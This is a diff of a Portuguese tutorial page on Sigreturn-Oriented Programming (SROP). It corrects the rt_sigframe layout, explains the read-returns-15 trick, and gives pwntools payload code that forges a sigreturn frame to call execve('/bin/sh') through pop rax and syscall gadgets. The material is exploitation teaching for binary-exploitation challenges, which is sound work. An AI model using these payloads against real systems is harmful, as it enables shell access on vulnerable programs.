@@ -3,11 +3,9 @@ title: SIGROP (Sigreturn-Oriented Programming)
 sidebar_position: 3
 ---
 
-Sigreturn é quando um programa é interrompido por um sinal (SIGINT, SIGSEV, etc). 
+Quando um programa recebe um sinal (SIGINT, SIGSEGV, SIGALRM, etc) e tem um *handler* (função de tratamento) registrado para ele, o kernel interrompe o programa, salva TODO o estado dele (todos os registradores) na stack e chama o handler. Quando o handler termina, é chamada a syscall `sigreturn()` (`rt_sigreturn`, número 15 em x86-64), que lê esse estado salvo da stack e restaura TUDO, para o programa continuar exatamente de onde parou.
 
-Quando o programa é interrompido, o kernel salva TODO o estado do programa (registradores). Ao retornar (`sigreturn()`), restaura TUDO o que estava salvo.
-
-Normalmente estamos acostumados como o SIGSEV, que é um erro grave do programa e ele encerra imediatamente. Mas outros erros, como SIGINT, SIGALRM, etc, apenas param a execução salvam o estado, fazem algo e depois voltam exatamente do estado salvo.
+Normalmente estamos acostumados com o SIGSEGV, que mata o programa. Mas, se houver um handler, qualquer sinal segue esse fluxo: pausar, salvar o estado, executar o handler e voltar ao estado salvo.
 
 |Sinal	|Significado	|Como acontece	|Padrão|
 |-------|---------------|---------------|------|
@@ -22,16 +20,16 @@ Um exemplo de cenário de SIGINT:
 2. Usuário aperta Ctrl+C → SIGINT
 3. Kernel automaticamente:
    - Pausa programa
-   - PUSH: Salva RAX, RBX, RCX, RIP, RSP... na pilha
-   - Chama função de tratamento
+   - Salva RAX, RBX, RCX, RIP, RSP... na pilha (a struct `rt_sigframe`, que veremos abaixo)
+   - Chama função de tratamento, deixando como "endereço de retorno" dela um trampolim que chama `sigreturn()`
 4. Tratamento faz algo (ex: salvar arquivo)
-5. sigreturn() automático:
-   - POP: **Restaura RAX, RBX, RCX, RIP, RSP...**
+5. O handler retorna no trampolim, que faz a syscall `sigreturn()`:
+   - Kernel lê a struct da pilha e **restaura RAX, RBX, RCX, RIP, RSP...**
    - Continua execução normal
 
-Podemos forjar uma estrutura na pilha que simula um estado salvo, e chamar `sigreturn()` para carregar nossos valores em TODOS os registradores de uma vez! Isso pois o kernel não verifica se o estado sendo restaurado é legítimo.
+Podemos forjar uma estrutura na pilha que simula um estado salvo, e chamar `sigreturn()` para carregar nossos valores em TODOS os registradores de uma vez! Isso pois o kernel não verifica se o estado sendo restaurado é legítimo (ele não tem como saber se foi ele mesmo que salvou aquilo).
 
-Isso evita ter que usar muitos gadgets, como fazemos no ROP comum. No SIGROP, controlamos tudo com uma só chamada.
+Isso evita ter que usar muitos gadgets, como fazemos no ROP comum. No SIGROP, controlamos tudo com uma só chamada. Tudo o que precisamos é de um gadget `syscall` (ou `syscall; ret`) e de um jeito de colocar `15` em `rax`. Por isso, o SIGROP é a técnica padrão para binários **estáticos e minúsculos** (sem libc, com poucos gadgets), que é um tipo de desafio bem comum.
 
 ## Fazendo o SIGROP
 
@@ -51,8 +49,8 @@ struct _fpstate {
 struct sigcontext {
     // Registradores de propósito geral
     uint64_t r8, r9, r10, r11, r12, r13, r14, r15, rdi, rsi, rbp;
-    uint64_t rbx;      // Base Pointer
-    uint64_t rdx;rax;rcx;
+    uint64_t rbx;
+    uint64_t rdx, rax, rcx;
     uint64_t rsp;      // Stack Pointer
     uint64_t rip;      // Instruction Pointer (CRÍTICO!)
     uint64_t eflags;   // Flags da CPU
@@ -61,7 +59,7 @@ struct sigcontext {
     uint16_t cs;       // Code Segment (deve ser 0x33)
     uint16_t gs;
     uint16_t fs;
-    uint16_t __pad0;
+    uint16_t ss;       // Stack Segment (0x2b). Em versões antigas do kernel se chamava __pad0
     
     // Informações de erro
     uint64_t err, trapno, oldmask;
@@ -161,7 +159,9 @@ OFFSET  TAMANHO  CAMPO                   IMPORTÂNCIA
 
 ### Como fazer a struct na stack
 
-Para fazer o SIGROP vamos chamar usar a syscall `sigreturn()`, que faz a restauração de estado. A `struct sigcontext` precisa vir **imediatamente após a syscall**. Cuidado: Se você criar a struct manualmente (sem pwntools), a syscall `sigreturn()` vai pegar o que estiver na stack, podendo pegar lixo e crashar o programa. Abaixo, vemos como a struct sigcontext
+Para fazer o SIGROP vamos usar a syscall `sigreturn()`, que faz a restauração de estado. O frame precisa vir **imediatamente após o endereço do gadget `syscall`** na stack. Cuidado: se você criar a struct manualmente (sem pwntools), a syscall `sigreturn()` vai pegar o que estiver na stack, podendo pegar lixo e crashar o programa.
+
+Um detalhe importante sobre o `pretcode`: no fluxo normal, o handler retorna com `ret`, que **desempilha** o `pretcode` (o endereço do trampolim) antes da syscall acontecer. Por isso, o kernel assume que, no momento do `sigreturn`, `rsp` já aponta para o campo **seguinte** ao `pretcode`, ou seja, para `uc_flags` (ele calcula `frame = rsp - 8`). No nosso ataque, o papel do `pretcode` é feito pelo próprio endereço do gadget `syscall`, que o `ret` anterior desempilhou. **Então o nosso frame começa em `uc_flags`, logo após o endereço do gadget, sem nenhum campo extra.**
 
 ```
 ANTES do sigreturn():
@@ -169,9 +169,8 @@ ANTES do sigreturn():
 ├── ... outros dados ...
 ├── POP_RAX_ADDR        ← Retorno atual (pop rax; ret)
 ├── 15                  ← Valor para RAX
-├── SYSCALL_ADDR        ← syscall; ret (chama sigreturn)
-└── ↓↓↓ AQUI COMEÇA A STRUCT RT_SIGFRAME ↓↓↓
-    ├── pretcode        ← 8 bytes (lixo/endereço útil)
+├── SYSCALL_ADDR        ← syscall; ret (chama sigreturn). Faz o papel do "pretcode"
+└── ↓↓↓ AQUI COMEÇA O NOSSO FRAME (rsp aponta aqui durante a syscall) ↓↓↓
     ├── uc_flags        ← 8 bytes (0)
     ├── uc_link         ← 8 bytes (0)
     ├── uc_stack.ss_sp  ← 8 bytes (0)
@@ -233,9 +232,13 @@ func:
 
 Caso contrário, só o RSP importa (existem programas que fazem tudo com base no RSP).
 
-Mas há exceções para esses registradores críticos. Se você usar o SIGROP para chamar `execve("/bin/sh")`, por exemplo, **o novo processo substitui o espaço de memória e o estado anterior é destruído**. Assim, não importa se houverem registradores inválidos.
+Mas há exceções para esses registradores críticos. Se você usar o SIGROP para chamar `execve("/bin/sh")`, por exemplo, **o novo processo substitui o espaço de memória e o estado anterior é destruído**. Assim, não importa se houverem registradores inválidos (desde que `rip` aponte para o `syscall` e `cs` seja válido).
 
-Para outras syscalls como `read`, `write`, `open`, **o crash será somente após o syscall**, assim você ainda pode se aproveitar disso para fazer o que tem que ser feito antes do crash.
+Para outras syscalls como `read`, `write`, `open`, **o crash será somente após o syscall**, assim você ainda pode se aproveitar disso para fazer o que tem que ser feito antes do crash. Melhor ainda: se `rip` apontar para um gadget `syscall; ret` e `rsp` apontar para a continuação da sua chain, depois da syscall a execução volta para a stack e você pode encadear **vários** frames (ex: `read` para colocar `/bin/sh` em memória, depois `execve`).
+
+### Como colocar 15 em rax sem `pop rax`
+
+Em binários pequenos, nem sempre existe `pop rax; ret`. O truque clássico é usar o **valor de retorno de `read`**: `read(0, buf, N)` retorna em `rax` a quantidade de bytes lidos. Então, se o programa fizer um `read` e você enviar exatamente **15 bytes**, `rax` vale 15 ao final, e basta que o próximo endereço de retorno seja o gadget `syscall`. Por isso muitos exploits de SIGROP têm um `p.send(b'A' * 15)` no meio.
 
 ### Versão sem SigreturnFrame() do pwntools
 
@@ -260,16 +263,15 @@ payload += p64(POP_RAX)
 payload += p64(15)            # sigreturn syscall number
 payload += p64(SYSCALL)       # syscall; ret
 
-# 2. Montar rt_sigframe MANUALMENTE
-# Parte 1: Campos antes do sigcontext (48 bytes)
+# 2. Montar o frame MANUALMENTE (começa em uc_flags: o pretcode é o SYSCALL_ADDR acima)
+# Parte 1: Campos antes do sigcontext (40 bytes)
 frame = b""
-frame += p64(0)              # pretcode
 frame += p64(0)              # uc_flags
 frame += p64(0)              # uc_link
 frame += p64(0)              # uc_stack.ss_sp
 frame += p64(0)              # uc_stack.ss_flags
 frame += p64(0)              # uc_stack.ss_size
-# Total: 6 * 8 = 48 bytes
+# Total: 5 * 8 = 40 bytes
 
 # Parte 2: sigcontext (começa aqui!)
 # r8-r15 (8 registradores)
@@ -291,32 +293,29 @@ frame += p64(SYSCALL)        # rip
 # eflags
 frame += p64(0x202)          # interrupts enabled
 
-# cs, gs, fs, pad
+# cs, gs, fs, ss
 frame += p16(0x33)           # cs (64-bit user)
 frame += p16(0)              # gs
 frame += p16(0)              # fs
-frame += p16(0)              # pad
+frame += p16(0x2b)           # ss (64-bit user data). 0 também costuma funcionar
 
 # err, trapno, oldmask, cr2
 frame += p64(0) * 4
 
 # fpstate + reserved[8]
-frame += p64(0)              # fpstate
+frame += p64(0)              # fpstate (NULL = sem estado de FPU)
 frame += p64(0) * 8          # reserved
 
-# Parte 3: uc_sigmask + padding (128 + 224 bytes)
-frame += p64(0) * 16         # uc_sigmask (128 bytes)
-frame += p64(0) * 28         # padding para 16-byte align (224 bytes)
-
-# Parte 4: siginfo_t (128 bytes) - opcional mas presente
-frame += p64(0) * 16         # 128 bytes
+# Parte 3: uc_sigmask (8 bytes: a máscara de sinais do kernel tem 64 bits)
+frame += p64(0)
 
 payload += frame
 
-print(f"Frame size: {len(frame)} bytes")
+print(f"Frame size: {len(frame)} bytes")   # 248 bytes, o mesmo tamanho do SigreturnFrame do pwntools
 print(f"Total payload: {len(payload)} bytes")
-# Resultado: 48 + 320 + 128 + 224 + 128 = ~848 bytes
 ```
+
+O `siginfo_t` e o resto da `ucontext` da glibc (que são maiores) ficam **depois** disso no frame real, mas o `sigreturn` não precisa deles: só lê até a `uc_sigmask`. Por isso o pwntools gera exatamente esses 248 bytes.
 
 ### Versão com SigreturnFrame() do pwntools
 
@@ -353,18 +352,18 @@ payload += p64(SYSCALL_ADDR)  # syscall; ret
 # Passo 3: Estrutura forjada do rt_sigframe na pilha
 # O pwntools já cria a estrutura COMPLETA automaticamente
 
-sigframe = SigreturnFrame(kernel='amd64')  # Especifica arquitetura
+sigframe = SigreturnFrame(kernel='amd64')  # Especifica arquitetura (usa context.arch se omitido)
 sigframe.rax = 59             # syscall execve
 sigframe.rdi = BINSH_ADDR     # endereço de "/bin/sh"
 sigframe.rsi = 0              # argv = NULL
 sigframe.rdx = 0              # envp = NULL
 sigframe.rip = SYSCALL_ADDR   # syscall após sigreturn
-sigframe.rsp = 0x7fffffffe000 # stack válida (IMPORTANTE!)
-sigframe.cs = 0x33            # code segment 64-bit user
+sigframe.rsp = 0x7fffffffe000 # stack válida (IMPORTANTE se for continuar executando depois)
+# cs = 0x33 e ss = 0x2b já vêm preenchidos por padrão
 
 # Se quiser ver o que está sendo criado:
 print(f"Tamanho do frame: {len(bytes(sigframe))} bytes")
-# ~440 bytes para x86_64
+# 248 bytes para x86_64 (80 bytes para i386)
 
 payload += bytes(sigframe)
 
